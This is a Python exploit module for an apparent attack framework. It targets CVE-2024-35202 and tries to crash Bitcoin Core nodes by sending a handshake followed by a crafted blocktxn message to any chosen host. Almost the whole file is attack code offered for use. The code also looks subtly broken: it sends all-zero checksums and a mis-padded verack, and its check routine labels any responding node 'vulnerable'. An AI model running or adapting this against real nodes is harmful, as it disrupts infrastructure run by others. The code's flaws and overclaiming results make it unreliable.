"""CVE-2024-35202: Bitcoin Core blocktxn Message DoS

This vulnerability allows remote attackers to crash Bitcoin Core nodes
via a specially crafted blocktxn message that triggers an assertion failure.

Reference: https://bitcoincore.org/en/2024/10/08/disclose-blocktxn-crash/
Reference: https://nvd.nist.gov/vuln/detail/CVE-2024-35202

Affected: Bitcoin Core < 25.0
Severity: HIGH (7.5 CVSS)
"""

import asyncio
import struct

from minesploit.framework import Exploit, ExploitMeta, ExploitResult


class CVE_2024_BLOCKTXN_DOS(Exploit):
    meta = ExploitMeta(
        name="CVE-2024-35202: Bitcoin Core blocktxn DoS",
        cve="CVE-2024-35202",
        cvss_score=7.5,
        severity="HIGH",
        affected_versions="Bitcoin Core < 25.0",
        discovered_by='Pieter "sipa" Wuille',
        disclosure_date="2024-10-08",
        description=(
            "Bitcoin Core before 25.0 allows remote attackers to cause a denial of service "
            "(blocktxn message-handling assertion failure) via a crafted blocktxn message "
            "in response to a getblocktxn request"
        ),
        references=[
            "https://bitcoincore.org/en/2024/10/08/disclose-blocktxn-crash/",
            "https://nvd.nist.gov/vuln/detail/CVE-2024-35202",
        ],
    )

    def __init__(self):
        super().__init__()

    def _create_malformed_blocktxn(self, block_hash: bytes) -> bytes:
        message = b"blocktxn"
        payload = block_hash + struct.pack("<I", 0)
        checksum = b"\x00\x00\x00\x00"

        magic = b"\xf9\xbe\xb4\xd9"
        header = magic + message + struct.pack("<I", len(payload)) + checksum

        return header + payload

    async def check(self, target: str, port: int = 8333, **kwargs) -> ExploitResult:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port),
                timeout=10.0,
            )

            version_msg = self._create_version_message()
            writer.write(version_msg)
            await writer.drain()

            await asyncio.wait_for(reader.read(1024), timeout=10.0)

            verack_msg = b"\xf9\xbe\xb4\xd9verack\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            writer.write(verack_msg)
            await writer.drain()

            await asyncio.wait_for(reader.read(1024), timeout=10.0)

            getblocktxn = self._create_getblocktxn_request()
            writer.write(getblocktxn)
            await writer.drain()

            response = await asyncio.wait_for(reader.read(4096), timeout=10.0)

            writer.close()
            await writer.wait_closed()

            if response and len(response) > 24:
                return ExploitResult(
                    True,
                    "Bitcoin Core node detected - may be vulnerable",
                    {"vulnerable": True, "service": "bitcoind"},
                )

            return ExploitResult(False, "No Bitcoin Core response detected")

        except asyncio.TimeoutError:
            return ExploitResult(False, "Connection timed out")
        except ConnectionRefusedError:
            return ExploitResult(False, "Connection refused")
        except Exception as e:
            return ExploitResult(False, f"Error: {str(e)}")

    def _create_version_message(self) -> bytes:
        magic = b"\xf9\xbe\xb4\xd9"
        command = b"version\x00\x00\x00\x00\x00"

        payload = struct.pack("<I", 70015)
        payload += b"\x00" * 8
        payload += struct.pack("<Q", 0)
        payload += b"\x00" * 10
        payload += struct.pack("<Q", 0)
        payload += b"\x00" * 8
        payload += b"\x00"
        payload += b"\x00" * 10
        payload += b"\x00" * 24

        checksum = b"\x00\x00\x00\x00"

        return magic + command + struct.pack("<I", len(payload)) + checksum + payload

    def _create_getblocktxn_request(self) -> bytes:
        magic = b"\xf9\xbe\xb4\xd9"
        command = b"getblocktxn\x00"

        block_hash = b"\x00" * 32
        payload = block_hash + struct.pack("<I", 0)

        checksum = b"\x00\x00\x00\x00"

        return magic + command + struct.pack("<I", len(payload)) + checksum + payload

    async def exploit(
        self,
        target: str,
        port: int = 8333,
        **kwargs,
    ) -> ExploitResult:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target, port),
                timeout=10.0,
            )

            version_msg = self._create_version_message()
            writer.write(version_msg)
            await writer.drain()

            await asyncio.wait_for(reader.read(1024), timeout=10.0)

            verack_msg = b"\xf9\xbe\xb4\xd9verack\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            writer.write(verack_msg)
            await writer.drain()

            await asyncio.wait_for(reader.read(1024), timeout=10.0)

            getblocktxn = self._create_getblocktxn_request()
            writer.write(getblocktxn)
            await writer.drain()

            malformed_blocktxn = self._create_malformed_blocktxn(b"\x00" * 32)
            writer.write(malformed_blocktxn)
            await writer.drain()

            writer.close()
            await writer.wait_closed()

            return ExploitResult(
                True,
                f"Malformed blocktxn sent to {target}:{port}",
                {"sent": True},
            )

        except Exception as e:
            return ExploitResult(False, f"Error during exploit: {str(e)}")

    async def verify(self, target: str, port: int = 8333, **kwargs) -> ExploitResult:
        return ExploitResult(
            True,
            "Verification requires checking if node crashed",
        )
